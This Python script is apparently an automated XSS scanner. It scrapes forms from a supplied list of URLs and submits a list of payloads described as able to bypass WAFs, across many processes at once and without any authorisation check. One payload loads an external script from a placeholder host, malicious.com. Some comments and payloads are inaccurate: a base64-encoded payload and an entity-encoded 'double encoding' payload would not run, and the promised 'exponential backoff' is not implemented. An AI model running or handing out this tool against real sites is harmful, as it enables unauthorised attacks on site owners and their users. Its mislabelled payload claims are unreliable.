import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import time
import random
import base64
import logging
import multiprocessing
import sys
from colorama import init, Fore

# Initialize colorama for colorful terminal output
init(autoreset=True)

# Setting up logging
logging.basicConfig(filename='xss_scan.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Sophisticated XSS Payloads for bypassing WAF
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",  # Basic XSS
    "<img src='x' onerror='alert(1)'>",  # Image-based XSS
    "<svg/onload=alert('XSS')>",  # SVG-based XSS
    "<body onload=alert('XSS')>",  # Onload event XSS
    "<input type='image' src='x' onerror='alert(1)'>",  # Image Input XSS
    "<a href='javascript:alert(1)'>Click me</a>",  # Link-based XSS
    "<script>eval(String.fromCharCode(88,83,83))</script>",  # Encoded XSS
    base64.b64encode("<script>alert('XSS')</script>".encode()).decode(),  # Base64 Encoded XSS
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",  # Hexadecimal encoding
    "<script>setTimeout(function(){alert('XSS')}, 1000)</script>",  # Delayed XSS using setTimeout
    "&#x25;&#x33;&#x43;script&#x25;&#x33;&#x43;alert('XSS')&#x25;&#x33;&#x43;/script&#x25;&#x33;&#x43;",  # Double encoding
    "<script>setInterval(function(){alert('XSS')}, 1000)</script>",  # Time-based XSS using setInterval
    "<script>eval('String.fromCharCode(88,83,83)')()</script>",  # Eval-based encoding
    "<input type='text' value='alert(1)'>",  # Input-based XSS
    "<details open><summary>Click me</summary><script>alert('XSS')</script></details>",  # HTML5 element-based XSS
    "javascript:alert('XSS')",  # JavaScript URI XSS
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",  # Dynamic Injection XSS
    "<img src=x onerror=eval('alert(1)')>",  # Eval within event handler XSS
    "<script src='http://malicious.com/malicious.js'></script>",  # External script link
    "<img src='file.svg' onload='alert(1)'>",  # SVG-based file upload XSS
    "%00<script>alert('XSS')</script>",  # Null byte injection
]

def get_all_forms(url):
    """Fetch all forms from the HTML content"""
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()  # Check for HTTP errors
        soup = bs(response.content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error fetching {url}: {e}")
        logging.error(f"Error fetching {url}: {e}")
        return []

def get_form_details(form):
    """Extract details from the form"""
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    # Handle textareas and selects
    for textarea in form.find_all("textarea"):
        input_name = textarea.attrs.get("name")
        inputs.append({"type": "textarea", "name": input_name})

    for select in form.find_all("select"):
        input_name = select.attrs.get("name")
        inputs.append({"type": "select", "name": input_name})

    for input_tag in form.find_all("input", {"type": "hidden"}):
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": "hidden", "name": input_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    """Submit a form with the payload"""
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] in ["text", "search", "textarea"]:
            data[input_tag["name"]] = value
        elif input_tag["type"] == "select":
            data[input_tag["name"]] = input_tag["name"]
        elif input_tag["type"] == "hidden":
            data[input_tag["name"]] = "hidden_value"

    try:
        if form_details["method"] == "post":
            response = requests.post(target_url, data=data, timeout=10)
        else:
            response = requests.get(target_url, params=data, timeout=10)
        return response
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"Error submitting form: {e}")
        logging.error(f"Error submitting form to {target_url}: {e}")
        return None

def scan_xss(url, output_file, total_urls, processed_urls):
    """Scan the URL for XSS vulnerabilities"""
    forms = get_all_forms(url)
    print(Fore.GREEN + f"[+] Found {len(forms)} forms on {url}.")
    is_vulnerable = False

    for form in forms:
        form_details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            print(Fore.YELLOW + f"[*] Testing payload: {payload}")
            response = submit_form(form_details, url, payload)
            if response and payload in response.text:
                print(Fore.RED + f"[+] XSS vulnerability detected on {url}")
                logging.info(f"XSS vulnerability found on {url} using payload: {payload}")
                print(Fore.CYAN + f"[*] Form details:")
                pprint(form_details)
                is_vulnerable = True

            # Exponential backoff with random jitter (in case of rate-limiting)
            time.sleep(random.uniform(1, 3))

    # Update progress using Manager
    processed_urls.value += 1
    progress_percentage = (processed_urls.value / total_urls) * 100
    print(Fore.CYAN + f"\rProgress: {processed_urls.value}/{total_urls} URLs scanned ({progress_percentage:.2f}%)", end="")

    # Save results to file
    if is_vulnerable:
        with open(output_file, 'a') as f:
            f.write(f"Vulnerable URL: {url}\n")
            logging.info(f"Vulnerable URL found: {url}")

def scan_concurrently(urls, output_file):
    """Scan multiple URLs concurrently using multiprocessing"""
    total_urls = len(urls)
    # Use Manager to create a shared value for tracking progress
    with multiprocessing.Manager() as manager:
        processed_urls = manager.Value('i', 0)
        with multiprocessing.Pool(processes=multiprocessing.cpu_count()) as pool:
            pool.starmap(scan_xss, [(url, output_file, total_urls, processed_urls) for url in urls])

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Scan URLs for XSS vulnerabilities")
    parser.add_argument("-i", "--input", required=True, help="Input file containing list of URLs")
    parser.add_argument("-o", "--output", required=True, help="Output file to save the results")
    args = parser.parse_args()

    with open(args.input, 'r') as file:
        urls = [url.strip() for url in file.readlines()]

    print(Fore.CYAN + f"Starting scan for {len(urls)} URLs...")
    scan_concurrently(urls, args.output)

    print(Fore.GREEN + f"Scan completed. Results saved to {args.output}")

if __name__ == "__main__":
    main()
